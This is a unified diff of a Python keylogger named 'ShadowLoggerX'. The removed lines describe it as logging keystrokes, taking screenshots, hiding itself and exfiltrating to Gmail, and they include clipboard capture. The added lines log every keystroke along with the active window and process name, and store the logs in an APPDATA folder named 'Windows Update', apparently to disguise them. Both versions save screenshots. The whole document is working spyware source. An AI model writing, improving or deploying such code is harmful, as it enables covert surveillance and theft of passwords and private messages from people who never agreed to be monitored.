@@ -1,78 +1,104 @@
-"""
-ShadowLoggerX
-- logs keystrokes
-- takes screenshots
-- hides itself
-- exfiltrates data to gmail
-
-"""
-
-from typing_extensions import Buffer
-import pynput 
 import os
-from pynput import keyboard
-from datetime import datetime as timestamp
 import pyautogui
-import pyperclip
+import time
+import threading
+import win32gui
+import win32process
+import psutil
+from datetime import datetime
+from pynput import keyboard
 
-log_file= os.path.join(os.getenv('APPDATA'),"WindowsUpdate.log")
-roaming_folder = os.path.join(os.getenv('APPDATA'),"ShadowLogs")
+# ─── Setup ─────────────────────────────────────────────────────────────
+appdata = os.getenv('APPDATA')
+if not appdata:
+    print("ERROR: APPDATA environment variable not found.")
+    exit(1)
+
+today = datetime.now().strftime("%Y-%m-%d")
+log_folder = os.path.join(appdata, "Windows Update")
+roaming_folder = os.path.join(appdata, "ShadowLogs")
+
+os.makedirs(log_folder, exist_ok=True)
 os.makedirs(roaming_folder, exist_ok=True)
-buffer=''
-ctrl_pressed=False
-with open(log_file, "a") as f:
-        f.write(f"\n(-----------------------------------------------------------------------------------------------------------------------------------------)\n")
-        f.write(f"([SESSION STARTED]     {timestamp.now().strftime('%Y-%m-%d %H:%M:%S')})\n")
+
+log_file = os.path.join(log_folder, f"{today}.log")
+last_window = None
+buffer = ''
+
+# ─── Utilities ─────────────────────────────────────────────────────────
+def write_log(content):
+    with open(log_file, "a", encoding="utf-8", errors="replace") as f:
+        f.write(content)
+
+def get_window():
+    try:
+        hwnd = win32gui.GetForegroundWindow()
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        process = psutil.Process(pid)
+        title = win32gui.GetWindowText(hwnd)
+        return f"{process.name()} - {title}"
+    except Exception:
+        return "Unknown Window"
+
+# ─── Key Press Handler ─────────────────────────────────────────────────
 def on_press(key):
-    global buffer
+    global buffer, last_window
+    curr_window = get_window()
+    if curr_window != last_window:
+        last_window = curr_window
+        timestamp_str = datetime.now().strftime('%H:%M:%S')
+        write_log(f"\n⏺️ [{curr_window} - {timestamp_str}]\n")
+
     try:
         if key == keyboard.Key.backspace:
             buffer = buffer[:-1]
-        elif ctrl_pressed and keyboard.Key.c == key:
-            img=pyautogui.screenshot()
-            clip=pyperclip.paste()
-            img.save(os.path.join(roaming_folder, f'screenshot_{timestamp.now().strftime("%Y%m%d_%H%M%S")}.png'))
-            with open(log_file,"a") as f:
-                f.write(f"\n[Clipboard content copied at {timestamp.now().strftime('%Y-%m-%d %H:%M:%S')}]")
-            buffer+=clip           
-        else:
-            buffer+=key.char
-    except AttributeError:
-        if key in [keyboard.Key.shift, keyboard.Key.shift_r,
-                   keyboard.Key.shift_l, keyboard.Key.caps_lock,
-                   keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
-                   keyboard.Key.alt_l, keyboard.Key.alt_r]:
-            pass
-        if key == keyboard.Key.space:
+        elif key == keyboard.Key.space:
             buffer += ' '
         elif key == keyboard.Key.enter:
             buffer += '\n'
-            with open(log_file, "a") as f:
-                f.write(buffer)
+            write_log(buffer)
             buffer = ''
-        else:
-            pass
-            
-                
+        elif hasattr(key, 'char') and key.char is not None:
+            buffer += key.char
+    except Exception as e:
+        print(f"[ERROR] Key processing error: {e}")
 
+# ─── Key Release Handler ───────────────────────────────────────────────
 def on_release(key):
-    if key==keyboard.Key.esc:
-        img=pyautogui.screenshot()
-        img.save(os.path.join(roaming_folder, f'screenshot_{timestamp.now().strftime("%Y%m%d_%H%M%S")}.png'))
-        with open(log_file, "a") as f:
-            f.write(f"(\n[SESSION ENDED]     {timestamp.now().strftime('%Y-%m-%d %H:%M:%S')})")
-            f.write(f"\n(-----------------------------------------------------------------------------------------------------------------------------------------)\n")
+    global buffer
+    if key == keyboard.Key.esc:
+        # Save screenshot
+        try:
+            img = pyautogui.screenshot()
+            img.save(os.path.join(roaming_folder, f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}_exit.png'))
+        except Exception as e:
+            print(f"[ERROR] Screenshot failed: {e}")
+
+        # Flush remaining buffer and write session end
+        if buffer.strip():
+            write_log(buffer + '\n')
+        write_log("\n╔════════════════════════════════════════════════════════════════════════════╗\n")
+        write_log(f"║                        [ SESSION ENDED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ]             ║\n")
+        write_log("╚════════════════════════════════════════════════════════════════════════════╝\n")
         return False
 
-
+# ─── Main Entry ────────────────────────────────────────────────────────
 def __main__():
     print("ShadowLoggerX is running...")
-    print(f"Logs will be saved to {log_file}")
+    print(f"Logs will be saved to: {log_file}")
     print("Press ESC to stop logging.")
+
+    write_log("\n╔════════════════════════════════════════════════════════════════════════════╗\n")
+    write_log(f"║                        [ SESSION STARTED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ]           ║\n")
+    write_log("╚════════════════════════════════════════════════════════════════════════════╝\n")
+
     try:
         with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
             listener.join()
     except KeyboardInterrupt:
         print("Logging interrupted by user.")
+    except Exception as e:
+        print(f"[ERROR] Listener failed: {e}")
+
 if __name__ == "__main__":
-    __main__()  
+    __main__()
